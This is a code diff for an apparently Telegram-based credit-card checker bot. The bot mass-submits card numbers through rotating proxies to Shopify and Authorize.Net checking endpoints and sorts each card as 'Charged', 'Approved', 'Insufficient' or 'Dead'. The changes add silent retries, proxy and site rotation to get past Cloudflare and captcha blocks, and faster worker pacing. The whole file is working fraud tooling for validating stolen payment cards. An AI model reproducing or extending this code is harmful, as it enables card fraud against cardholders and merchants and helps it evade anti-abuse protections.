@@ -170,6 +170,7 @@ CE_HOURGLASS = '<tg-emoji emoji-id="5386367538735104399">⌛</tg-emoji>'
 CE_STAR = '<tg-emoji emoji-id="5794073296492303710">⭐</tg-emoji>'
 CE_THINK1 = '<tg-emoji emoji-id="5917785839428967062">🤔</tg-emoji>'
 CE_THINK2 = '<tg-emoji emoji-id="5918248669399754192">🤔</tg-emoji>'
+switch_emoji = '<tg-emoji emoji-id="5325547803936572038">✨</tg-emoji>'
 CE_THINK3 = '<tg-emoji emoji-id="5916025950809625537">🤔</tg-emoji>'
 CE_ALIEN = '<tg-emoji emoji-id="6028356293540977715">👾</tg-emoji>'
 CE_PHONE = '<tg-emoji emoji-id="5445059250382469069">📲</tg-emoji>'
@@ -185,6 +186,7 @@ CE_MAN = '<tg-emoji emoji-id="5447311106030726740">👨‍🦰</tg-emoji>'
 # ====================== CANCEL & STATUS EMOJIS ======================
 CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
 CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
+CE_CANDLE = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
 CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
 CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
 CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
@@ -744,7 +746,7 @@ async def get_bin_info(bin_code, session=None):
 
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "Unknown", "country_code": "", "flag": "🌐"}
 
-# ====================== SHOPIFY GATEWAY ENGINE (UPDATED WITH TRUE REAL CLASSIFICATION) ======================
+# ====================== SHOPIFY GATEWAY ENGINE (SILENT FILTRATION ENGINE) ======================
 async def check_shopify_api(api_url, card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -757,23 +759,17 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             site_param = f"https://{site_param}"
         site_encoded = quote(site_param)
         
-        # ربط الـ API الجديد مع البارامترات المحدثة
         req_url = f"{api_url}?site={site_encoded}&cc={card_encoded}&proxy={quote(proxy_str) if proxy_str else ''}"
-        
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-        }
+        headers = {"User-Agent": "Mozilla/5.0"}
         
         async with session.get(req_url, headers=headers, timeout=API_TIMEOUT) as resp:
-            # فلترة أخطاء الاتصال الحقيقية بالسيرفر مباشرة
             if resp.status in [500, 502, 503, 504]:
-                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'gateway': 'Shopify', 'retry': True}
+                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
 
             text_data = await resp.text()
             
-            # فلترة حظر كلوفلير المباشر
-            if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge"]):
-                return {'status': 'Site Error', 'message': 'Cloudflare Challenge Block', 'card': card, 'gateway': 'Shopify', 'retry': True}
+            if "<html" in text_data.lower() and any(k in text_data.lower() for k in ["cloudflare", "just a moment", "challenge", "captcha"]):
+                return {'status': 'Site Error', 'message': 'Cloudflare Blocked', 'card': card}
 
             gt = "Shopify"
             pr = "$5.00"
@@ -792,30 +788,34 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             clean_rm = unsf(rm).lower()
             
-            # --- الفرز الدقيق بناءً على الاستجابة الفعلية والبنكية الصريحة ---
-            # 1. حالة الشحن (Charged)
+            # 🛑 [تصفية الأخطاء الغبية] - أي رد تافه يخص المنصة أو الحمايات يحول كخطأ موقع فوراً ليتم تخطيه صامتاً خلف الكواليس
+            junk_filters = [
+                'login', 'requires login', 'login required', 'requires_login', 'signin',
+                'cloudflare', 'challenge', 'captcha', 'robot', 'not supported', 'not shopify',
+                'step 0', 'step 1', 'failed', '422', 'cart failed', 'error processing card',
+                'site dead', 'session_error', 'unauthorized', '401', '403', '404', 'empty stream',
+                'filed to', 'error possessing card', 'site error'
+            ]
+            if any(k in clean_rm for k in junk_filters):
+                return {'status': 'Site Error', 'message': rm, 'card': card}
+
+            # 🟢 الفرز البنكي الحقيقي والصريح فقط
             if any(k in clean_rm for k in ['charged', 'completed', 'payment succeeded', 'success', 'succeeded', 'captured']): 
                 return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                 
-            # 2. حالة القبول المباشر (Approved)
             if any(k in clean_rm for k in ['approved', 'cvv match', 'security code', 'invalid_cvv', 'incorrect_cvv', 'match']): 
                 return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
                 
-            # 3. حالة نقص الرصيد الحقيقية (Insufficient Funds)
             if any(k in clean_rm for k in ['insufficient', 'funds', 'balance', 'low balance']):
                 return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
             
-            # 4. حالات الرفض البنكي القاطع والصريح من العبارة والبطاقة (Dead)
             if any(k in clean_rm for k in ['declined', 'do not honor', '3d', 'secure', 'otp', 'challenge', 'pick up card', 'stolen', 'lost', 'fraud', 'not allowed', 'expired', 'processor_declined', 'card_declined', 'invalid account', 'invalid number', 'call issuer', 'limit exceeded']):
                 return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
             
-            # 5. أي استجابة مجهولة لا تحتوي على ثوابت البنك الصريحة تُعامل كأخطاء تشغيلية حقيقية (Site Error) لضمان عدم تلف الكروت
-            return {'status': 'Site Error', 'message': rm if rm else 'Empty Stream', 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
+            return {'status': 'Site Error', 'message': rm if rm else 'Empty Response', 'card': card}
         
-    except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'API Connection Timeout', 'card': card, 'retry': True}
     except Exception as e: 
-        return {'status': 'Site Error', 'message': f'Fatal Exception: {str(e)[:30]}', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': str(e), 'card': card}
 
 # ====================== ASYNC AUTHNET GATEWAY ENGINE ======================
 async def check_authnet_api(card, proxy, session):
@@ -824,61 +824,36 @@ async def check_authnet_api(card, proxy, session):
         card = card.strip()
         
         req_url = f"{AUTHNET_API_URL}?cc={quote(card)}&amount=5&amt=5&price=5"
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
-        }
+        headers = {"User-Agent": "Mozilla/5.0"}
         
         async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
             if resp.status in [500, 502, 503, 504]:
-                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
+                return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card}
             text_data = await resp.text()
             
-            pr = None
-            is_json = False
+            rm = text_data.strip()
             try:
                 rj = json.loads(text_data)
-                is_json = True
                 rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
-                
-                for k in ['Price', 'price', 'amount', 'Amount', 'amt', 'Amt', 'charged']:
-                    if k in rj and rj[k]:
-                        pr = str(rj[k]).strip()
-                        break
             except Exception:
-                rm = text_data.strip()
-                
-            if not is_json:
-                if resp.status != 200 or "<html" in text_data.lower() or len(text_data) > 300:
-                    return {'status': 'Site Error', 'message': 'API Returned HTML/Error Page (Blocked)', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
-                
-            if not pr:
-                price_match = re.search(r'\$\d+(?:\.\d{2})?', text_data)
-                pr = price_match.group(0) if price_match else "$5.00"
+                if "<html" in text_data.lower():
+                    return {'status': 'Site Error', 'message': 'HTML Blocked', 'card': card}
                 
             clean_rm = unsf(rm).lower()
             
-            if 'do not honor' in clean_rm:
-                rm = 'Card Declined'
-                clean_rm = 'card declined'
-            
             if any(k in clean_rm for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
-                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00'}
                 
             if any(k in clean_rm for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance']):
-                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
+                return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00'}
                 
-            if any(k in clean_rm for k in ['authentication_required', '3d', 'secure', 'verification', 'otp', 'held for review', 'review']):
-                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
+            if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid', 'do not honor', 'authentication_required', '3d', 'secure']):
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00'}
                 
-            if any(k in clean_rm for k in ['the transaction was declined', 'declined', 'card declined', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
-                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': pr}
-                
-            return {'status': 'Site Error', 'message': rm if rm else 'Empty API Response', 'card': card, 'gateway': 'Authorize.Net', 'price': pr, 'retry': True}
+            return {'status': 'Site Error', 'message': rm, 'card': card}
             
-    except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
     except Exception as e:
-        return {'status': 'Site Error', 'message': f'AuthNet API Error: {str(e)[:40]}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$5.00', 'retry': True}
+        return {'status': 'Site Error', 'message': str(e), 'card': card}
 
 async def remove_proxy_by_url(uid, proxy_url):
     try:
@@ -890,39 +865,44 @@ async def remove_proxy_by_url(uid, proxy_url):
                     break
     except Exception: pass
 
-async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
-    try:
-        if gateway_name == "AuthNet":
-            last_res = {'status': 'Dead', 'message': 'API Error', 'card': card}
-            for attempt in range(3): 
-                p = random.choice(proxies) if proxies else None
-                r = await check_authnet_api(card, p, session)
-                if r.get('status') == 'Site Error':
-                    await asyncio.sleep(random.uniform(2.0, 4.0)) 
-                    last_res = r
-                    continue
-                return r
-            return last_res
-
-        # تجربة إرسال الطلب للموقع المختار والبروكسي لمرة واحدة، والـ worker يتولى حلقة الإعادة الخارجية التامة
-        p_dict = random.choice(proxies) if proxies else None
-        p = p_dict['proxy_url'] if p_dict else None
-        s = random.choice(sites) if sites else "touch-of-finland.myshopify.com"
-            
+# ====================== BULLETPROOF AUTO RETRY & SILENT SKIP ENGINE ======================
+async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=12):
+    attempts = 0
+    active_proxies = list(proxies) if proxies else []
+    active_sites = list(sites) if sites else ["touch-of-finland.myshopify.com"]
+    
+    while attempts < max_retries:
+        attempts += 1
+        p_dict = random.choice(active_proxies) if active_proxies else None
+        p_url = p_dict['proxy_url'] if p_dict else None
+        s_target = random.choice(active_sites) if active_sites else "touch-of-finland.myshopify.com"
+        
         if gateway_name == "Shopify":
-            r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
-            status = r.get('status')
-            msg = str(r.get('message', '')).lower()
-            
-            if status == 'Site Error':
-                if p_dict and p_dict in proxies and any(k in msg for k in ['proxy', 'timeout', 'tunnel', 'close']):
-                    try: proxies.remove(p_dict)  
-                    except ValueError: pass
-            return r
+            res = await check_shopify_api(SHOPIFY_API_URL_1, card, s_target, p_url, session)
+        elif gateway_name == "AuthNet":
+            res = await check_authnet_api(card, p_url, session)
         else:
-            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
-    except Exception as e:
-        return {'status': 'Site Error', 'message': f'Fatal Checker Error: {str(e)[:40]}', 'card': card}
+            return {'status': 'Skipped', 'card': card}
+            
+        status = res.get('status')
+        
+        # إذا كانت النتيجة بنكية صريحة نخرج فوراً ونعتمدها
+        if status in ['Charged', 'Approved', 'Insufficient', 'Dead']:
+            return res
+            
+        # إذا واجهنا خطأ موقع غبي نقوم بحذف البروكسي والموقع من الفحص الحالي والمحاولة مجدداً بصمت خلف الكواليس
+        if status == 'Site Error':
+            if p_dict and len(active_proxies) > 1:
+                try: active_proxies.remove(p_dict)
+                except ValueError: pass
+            if s_target in active_sites and len(active_sites) > 1:
+                try: active_sites.remove(s_target)
+                except ValueError: pass
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            continue
+            
+    # إذا انتهت الـ 12 محاولة ولم نصل لرد موثق يتم إرجاع وضع التخطي الكامل
+    return {'status': 'Skipped', 'card': card}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
@@ -1467,6 +1447,7 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(current_workers))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
     asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
 
+# ====================== HIGH-SPEED CPM RESIDUAL CORE MASS ENGINE ======================
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards); chk = chg = app = ins = dec = err = 0
@@ -1474,16 +1455,13 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     
     sites = await get_shopify_sites()
     proxies = await get_all_user_proxies(uid)
-    if not proxies: proxies = []
-    else: proxies = list(proxies) 
+    proxies = list(proxies) if proxies else []
     
     http_session = await get_user_http_session(uid)
     last_resp = sf("Waiting for response...")
     def is_stopped(): return process_store.get(uid, {}).get("stopped", False)
 
     current_workers = 1 if gate_name == "AuthNet" else WORKERS
-
-    # قفل التوازن المتسلسل للتحكم بالسرعة
     pacing_lock = asyncio.Lock()
     hit_tasks = []
 
@@ -1527,56 +1505,50 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 try: card = queue.get_nowait()
                 except Exception: break
                 
-                # الحلقة الاحترافية اللانهائية: لن تترك البطاقة أبداً حتى تأتي استجابة مالية حقيقية وصريحة من الـ API
-                while not is_stopped():
-                    try:
-                        async with pacing_lock:
-                            if not is_stopped():
-                                await asyncio.sleep(random.uniform(0.1, 0.3))
-                        
-                        if is_stopped(): break
-                        
-                        c_st = time.time()
-                        res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
-                        if is_stopped(): break 
-                        
-                        c_el = time.time() - c_st
-                        status = res.get('status', 'Dead')
-                        raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
-                        
-                        # [تعديل ذهبي]: في حال حدوث أي خطأ بروكسي/اتصال/سيرفر، قم بإعادة المحاولة فوراً لنفس البطاقة وبدون احتسابها في عداد chk
-                        if status == 'Site Error':
-                            err += 1
-                            last_resp = sf(f"Retry Err: {(raw_msg[:25] + '..') if len(raw_msg) > 25 else raw_msg}")
-                            await asyncio.sleep(1.5) # مهلة بسيطة لتبديل الموقع أو البروكسي في المحاولة القادمة
-                            continue # إعادة المحاولة لنفس البطاقة
-                            
-                        # الـ API رد برد صريح وتم التعرف على حالة البطاقة بنجاح
-                        chk += 1
-                        last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
-                        
-                        if status == 'Charged':
-                            chg += 1
-                            ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                            hit_tasks.append(ht_task)
-                        elif status == 'Approved': 
-                            app += 1
-                        elif status == 'Insufficient': 
-                            ins += 1
-                        else: 
-                            dec += 1
-                            
-                        break # الخروج من الحلقة الداخلية للبطاقة والانتقال للبطاقة التالية بالملف
-                    except asyncio.CancelledError: 
-                        break
-                    except Exception as e:
-                        err += 1
-                        last_resp = sf(f"Sys Err: {str(e)[:20]}")
-                        await asyncio.sleep(2)
+                try:
+                    async with pacing_lock:
+                        if not is_stopped():
+                            await asyncio.sleep(random.uniform(0.05, 0.15))
+                    
+                    if is_stopped(): break
+                    
+                    c_st = time.time()
+                    # استدعاء محرك التدوير المطور ذو الـ 12 محاولة خلفية صامتة لتجنب أخطاء المواقع تماماً
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=12)
+                    if is_stopped(): break 
+                    
+                    c_el = time.time() - c_st
+                    status = res.get('status', 'Skipped')
+                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
+                    
+                    # 💎 [التخطي الصارم الكامل] - إذا فشلت كل المحاولات وعاد الوضع كـ Skipped، نتخطاه فوراً دون زيادة عداد الأخطاء ودون إزعاجك
+                    if status == 'Skipped':
+                        queue.task_done()
                         continue
                         
+                    # الـ API جلب رد بنكي صريح ونظيف؛ يتم تدوينه الآن بشكل رسمي
+                    chk += 1
+                    last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
+                    
+                    if status == 'Charged':
+                        chg += 1
+                        ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                        hit_tasks.append(ht_task)
+                    elif status == 'Approved': 
+                        app += 1
+                    elif status == 'Insufficient': 
+                        ins += 1
+                    elif status == 'Dead':
+                        dec += 1
+                        
+                except asyncio.CancelledError: 
+                    break
+                except Exception as e:
+                    err += 1
+                    last_resp = sf(f"Sys Err: {str(e)[:20]}")
+                    await asyncio.sleep(1)
+                    
                 queue.task_done()
-            
             await asyncio.sleep(0.01)
 
     wt = [asyncio.create_task(worker(i)) for i in range(current_workers)]
@@ -1616,7 +1588,8 @@ async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not t.done(): t.cancel()
     await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)
 
-async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()
+async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): 
+    await update.callback_query.answer()
 
 async def check_sites_loop():
     while True:
